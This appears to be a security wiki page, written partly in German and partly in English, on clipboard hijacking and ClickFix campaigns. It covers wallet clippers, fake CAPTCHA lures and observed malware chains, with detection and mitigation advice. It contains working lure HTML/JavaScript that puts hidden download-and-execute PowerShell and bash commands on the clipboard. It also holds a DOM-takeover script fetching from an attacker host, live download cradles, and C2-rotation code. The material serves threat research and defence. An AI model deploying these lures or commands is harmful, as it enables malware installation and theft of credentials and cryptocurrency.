# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – alter, aber immer noch gültiger Rat

## Überblick

Clipboard hijacking – auch bekannt als *pastejacking* – missbraucht die Tatsache, dass Nutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu prüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) platziert programmgesteuert vom Angreifer kontrollierten Text in der System-Clipboard. Opfer werden normalerweise durch sorgfältig formulierte Social-Engineering-Anweisungen dazu gebracht, **Win + R** (Run-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Clipboard *einzufügen*, wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Attachment geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Attachments, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher beliebt in Phishing-Kampagnen, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer verbreiten.

## Ersetzung von Wallet-Adressen durch Clippers

Eine weitere **clipboard hijacking**-Variante fügt überhaupt keine Befehle ein: Sie wartet, bis das Opfer eine **Kryptowährungs-Wallet-Adresse** kopiert, und tauscht sie dann unbemerkt kurz vor dem Einfügen gegen eine vom Angreifer kontrollierte Adresse aus. Das ist besonders wirksam bei langen Wallet-Formaten, weil Nutzer oft nur die ersten/letzten Zeichen überprüfen.

Häufige Merkmale aus der Praxis:
- **Dünner Loader + verschachteltes Payload**: Die sichtbare App/.exe wirkt wie ein legitimes Trading- oder "profit"-Tool, während der eigentliche clipper tiefer im Bundle versteckt ist (zum Beispiel ein .NET loader, der ein verschachteltes Rust payload startet).
- **Regex-gesteuerte Ersetzung**: Die Malware matcht Strings wie `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` oder sogar generische **44-Zeichen-Solana-ähnliche** Strings und schreibt sie auf Angreifer-Wallets um.
- **Wallet-Rotation im großen Maßstab**: Moderne Windows-Samples können **tausende** Ersetzungs-Wallets pro Währung einbetten statt nur einer statischen Adresse, wodurch die Reputation der Wallet nach jedem Diebstahl langsamer verbrannt wird.

### Windows-clipper-Flow

Eine gängige Implementierung ist ein verborgenes Fenster, das mit **`AddClipboardFormatListener`** registriert wird. Bei jeder Clipboard-Aktualisierung ruft die Malware typischerweise auf:
- **`OpenClipboard`** → auf aktuelle Clipboard-Daten zugreifen.
- **`GetClipboardData`** → Text lesen.
- **`EmptyClipboard`** + **`SetClipboardData`** → den Wallet-String durch den Angreiferwert ersetzen.

Minimale Hunting-Regexes, die häufig in clippers zu sehen sind:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-Level-Persistenz reicht für Impact aus. Ein beobachtetes Muster ist:
- Payload nach **`%APPDATA%\silke\silke.exe`** kopieren
- Eine **Startup-folder LNK** unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` erstellen

Erkennungsideen:
- Prozesse, die kontinuierlich Clipboard-APIs aufrufen und gleichzeitig unter `%APPDATA%` sowie im Benutzer-**Startup**-Ordner schreiben.
- Neue LNK-/Executable-Erstellung, gefolgt von Wallet-Address-Clipboard-Rewrites.
- Archive oder Fake-Software-Bundles mit vielen ungenutzten Dateien plus einem kleinen Launcher, der ein Nested Binary startet.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Auf macOS liefern einige Kampagnen ein **`unlocker.command`**-Hilfsprogramm aus und weisen das Opfer an, mit Rechtsklick → **Open** zu wählen, wenn Gatekeeper sagt, dass die App beschädigt ist oder von einem nicht identifizierten Entwickler stammt. Das Skript entfernt einfach die Quarantine und startet die benachbarte `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – Wrapper-Skript
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent mit `RunAtLoad` und `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen nutzten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. User besucht eine typosquatted oder kompromittierte Site (z. B. `docusign.sa[.]com`)
2. Eingeschleustes **ClearFake** JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der still einen Base64-kodierten PowerShell One-Liner in die Clipboard schreibt.
3. HTML-Anweisungen sagen dem Opfer: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei plus eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt weitere Stufen, injiziert shellcode und richtet Persistenz ein (z. B. scheduled task) – und führt letztlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) per **curl.exe** herunter, entschlüsselt sie mit einem Rolling-XOR-Key `"https://google.com/"`, injiziert die finale Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Ruft eine MSI-Payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → Shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` über `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Credentials an `sumeriavgv.digital` exfiltriert.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und weisen die Opfer an, eine One-Liner einzufügen, die JavaScript per WSH abruft und ausführt, es persistent macht und das C2 täglich rotiert. Beobachtete Beispielkette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Wesentliche Merkmale
- Obfuskierte URL wird zur Laufzeit umgekehrt, um eine oberflächliche Inspektion zu erschweren.
- JavaScript persistiert sich über einen Startup LNK (WScript/CScript) und wählt das C2 nach dem aktuellen Tag aus – das ermöglicht schnelle Domain-Rotation.

Minimaler JS-Fragment, das C2s nach Datum rotiert:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Nächste Phase setzt typischerweise einen Loader ein, der Persistenz etabliert und eine RAT (z. B. PureHVNC) nachlädt, oft mit TLS-Pinning an ein hartkodiertes Zertifikat und in Chunk-übertragenem Traffic.

Erkennungsansätze speziell für diese Variante
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Startup-Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, der WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry/RunMRU und Command-Line-Telemetrie mit `.split('').reverse().join('')` oder `eval(a.responseText)`.
- Wiederholtes `powershell -NoProfile -NonInteractive -Command -` mit großen stdin-Payloads, um lange Skripte ohne lange Command Lines zu übergeben.
- Scheduled Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem updater-ähnlichen Task/Pfad ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Täglich rotierende C2-Hostnames und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Clipboard-Write-Events mit anschließendem Win+R-Paste und danach sofortiger `powershell.exe`-Ausführung korrelieren.


Blue-Teams können Clipboard-, Process-Creation- und Registry-Telemetrie kombinieren, um Pastejacking-Missbrauch zu erkennen:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` speichert einen Verlauf von **Win + R**-Befehlen – nach ungewöhnlichen Base64- / obfuskierten Einträgen suchen.
* Security Event ID **4688** (Process Creation), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } liegt.
* Event ID **4663** für Dateierstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern direkt vor dem verdächtigen 4688-Event.
* EDR-Clipboard-Sensoren (falls vorhanden) – `Clipboard Write` direkt gefolgt von einem neuen PowerShell-Prozess korrelieren.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen erzeugen massenhaft gefälschte CDN-/Browser-Verification-Pages ("Just a moment…", IUAM-style), die Nutzer dazu bringen, OS-spezifische Befehle aus der Zwischenablage in native Konsolen zu kopieren. Dadurch wird die Ausführung aus der Browser-Sandbox heraus verlagert und funktioniert unter Windows und macOS.

Zentrale Merkmale der vom Builder erzeugten Pages
- OS-Erkennung via `navigator.userAgent`, um Payloads anzupassen (Windows PowerShell/CMD vs. macOS Terminal). Optionale Decoys/No-ops für nicht unterstützte OS, um die Illusion aufrechtzuerhalten.
- Automatisches Clipboard-Copy bei harmlosen UI-Aktionen (Checkbox/Copy), während der sichtbare Text vom Inhalt der Zwischenablage abweichen kann.
- Mobile-Blocking und ein Popover mit Schritt-für-Schritt-Anweisungen: Windows → Win+R→paste→Enter; macOS → Terminal öffnen→paste→Enter.
- Optionale Obfuskation und Single-File-Injector, um das DOM einer kompromittierten Site mit einer Tailwind-gestylten Verification-UI zu überschreiben (keine neue Domain-Registrierung erforderlich).

Beispiel: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-Persistenz des initialen Runs
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und sichtbare Artefakte reduziert werden.

In-Place-Page-Übernahme auf kompromittierten Sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichung zwischen angezeigtigem Text und clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in verdächtigen Kontexten.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; batch/MSI installers ausgeführt aus `%TEMP%`.
- macOS endpoint: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` nahe Browser-Ereignissen; Hintergrundjobs, die das Schließen des Terminals überleben.
- Korrelieren von `RunMRU` Win+R-Verlauf und Clipboard writes mit anschließender Konsolen-Prozess-Erstellung.

Siehe auch für unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Seiten und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) und sogar blockchain “etherhiding”-Aufrufe (z. B. POSTs an Binance Smart Chain API endpoints wie `bsc-testnet.drpc[.]org`) verkettet, um aktuelle lure logic zu laden. Neuere Overlays verwenden stark fake CAPTCHAs, die Nutzer anweisen, eine one-liner (T1204.004) zu kopieren/einzufügen, statt etwas herunterzuladen.
- Die Initialausführung wird zunehmend an signierte Script-Hosts/LOLBAS delegiert. Januar-2026-Ketten ersetzten die frühere `mshta`-Nutzung durch das integrierte `SyncAppvPublishingServer.vbs`, ausgeführt via `WScript.exe`, und übergaben PowerShell-ähnliche Argumente mit Aliases/Wildcards, um Remote-Inhalt abzurufen:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; zusammen mit `WScript.exe` und ungewöhnlichen Argumenten (`gal`/`gcm` Aliases, wildcarded cmdlets, jsDelivr URLs) wird es zu einem High-Signal LOLBAS-Stage für ClearFake.
- Februar 2026 Fake CAPTCHA payloads wechselten zurück zu reinen PowerShell download cradles. Zwei Live-Beispiele:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die erste Chain ist ein In-Memory `iex(irm ...)`-Grabber; die zweite staged über `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1` und startet dann mit `-ep bypass` in einem versteckten Fenster.

Detection/Hunting-Tipps für diese Varianten
- Process lineage: Browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell cradles direkt nach Clipboard-Schreibvorgängen/Win+R.
- Command-line-Schlüsselwörter: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker Domains oder raw IP `iex(irm ...)`-Muster.
- Network: ausgehender Traffic zu CDN-Worker-Hosts oder blockchain RPC Endpunkten von Script-Hosts/PowerShell kurz nach Web-Browsing.
- File/registry: temporäre `.ps1`-Erstellung unter `%TEMP%` plus RunMRU-Einträge mit diesen One-Linern; block/alert auf signierte Script-LOLBAS (WScript/cscript/mshta), wenn sie mit externen URLs oder obfuskierten Alias-Strings ausgeführt werden.

## Mitigations

1. Browser-Härtung – Clipboard Write-Zugriff deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder User Gesture verlangen.
2. Security Awareness – Nutzern beibringen, sensible Commands *abzutippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One-Liner zu blockieren.
4. Network Controls – ausgehende Requests zu bekannten Pastejacking- und Malware-C2-Domains blockieren.

## Related Tricks

* **Discord Invite Hijacking** missbraucht oft denselben ClickFix-Ansatz, nachdem Nutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
